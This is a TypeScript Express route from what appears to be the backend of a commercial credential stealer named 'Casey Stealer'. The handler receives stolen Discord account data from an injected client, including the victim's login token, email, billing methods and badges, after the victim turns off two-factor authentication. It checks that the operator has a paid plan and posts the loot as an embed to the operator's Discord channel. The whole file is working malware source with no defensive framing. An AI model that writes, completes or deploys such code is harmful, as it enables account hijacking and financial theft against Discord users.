import { Request, Response } from 'express';
import { ActionRowBuilder, ButtonBuilder, EmbedBuilder, ButtonStyle, ChannelType } from 'discord.js';
import { client } from '../../app';
import { emojis } from '../../utils/emojis';
import getAvatar from '../../functions/discord/getAvatar';
import { badges_name } from '../../utils/badges_name';
import { badges_emoji } from '../../utils/badges_emoji';

import { PrismaClient } from '@prisma/client'

const prisma = new PrismaClient();

export default {
    name: `/api/2fa-disable/`, method: 'post',

    async execute(req: Request, res: Response) {
        const { user, profile, billing, login, stealer_user } = req?.body;
        if(!user?.id || !stealer_user) return;

        const user_db = await prisma.users.findFirst({
            where: {
                id: stealer_user
            }
        });
  
        if(!user_db?.plan) return;

        const guild = await client.guilds.fetch(user_db?.guild_id!);
        const channel = await guild.channels.fetch(user_db?.channel_id!);
  
        if(channel?.type !== ChannelType.GuildText) return;

        const avatar_url = getAvatar(user.id, user.avatar);
        const badges_array = profile?.badges?.map((b: any) => badges_name.find(x => x?.id === b?.id)).map((n: any) => n?.name);
        const account_embed = new EmbedBuilder().setColor('#5865f2').setTimestamp().setThumbnail(avatar_url)
        .setAuthor({ name: `Casey | ${user.global_name} (@${user.username})`, iconURL: avatar_url! })
        .addFields(
            {
                name: `${emojis.token} Token:`,
                value: `\`\`\`${login?.token}\`\`\``
            },
            {
                name: `${emojis.badges} Badges:`,
                value: `${badges_array.map((b: any) => b != undefined ? badges_emoji[b as keyof typeof badges_emoji] : '').join('') || 'None'}`,
                inline: true
            },
            {
                name: `${emojis.pm} Billing:`,
                value: `${billing?.filter((p: any) => p.type === 1 || p.type === 2).map((b: any) => b.type != undefined ? emojis[b.type as keyof typeof emojis] : '').join('') || 'None'}`,
                inline: true
            },
            {
                name: `${emojis.twofa} 2FA:`,
                value: `Disabled`,
                inline: true
            },
            {
                name: `${emojis.email} Email:`,
                value: `${user.email || 'Unknown'}`,
                inline: true
            },
        ).setFooter({ text: `Casey Stealer | Injection (2FA Disabled)`, iconURL: client.user?.avatarURL()! });


        const boost_button = new ButtonBuilder().setCustomId(`BIF${profile?.badges?.find((x: any) => x?.id.startsWith('guild_booster_'))?.id}Casey${profile?.premium_guild_since}`).setLabel('View Boost Informations').setStyle(ButtonStyle.Secondary).setDisabled(true);
        if(profile?.premium_guild_since) 
        boost_button.setDisabled(false);

        channel.send({
            embeds: [
              account_embed,
            ],
            components: [
                new ActionRowBuilder<ButtonBuilder>().addComponents(
                    new ButtonBuilder().setCustomId(`HQF`).setLabel('View HQ Friends').setStyle(ButtonStyle.Primary)
                    .setEmoji(emojis.friends),
                    new ButtonBuilder().setCustomId(`HQG`).setLabel('View HQ Guilds').setStyle(ButtonStyle.Secondary),
                    boost_button
                )
            ]
        });

        res.status(200);
  },
};